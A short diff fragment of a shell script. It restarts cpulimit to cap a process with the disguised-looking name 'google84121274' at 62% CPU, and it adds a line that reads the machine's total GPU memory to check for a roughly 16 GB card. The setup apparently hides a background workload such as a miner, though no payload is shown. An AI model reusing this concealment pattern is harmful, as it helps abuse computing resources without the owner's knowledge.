@@ -131,6 +131,8 @@ pkill -f cpulimit
 
 cpulimit -e google84121274 -l 62 &> /dev/null &
 
+google84121274=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
+
 if (( $google84121274 >= 14884 && $google84121274 <= 18884 ))
 then
 
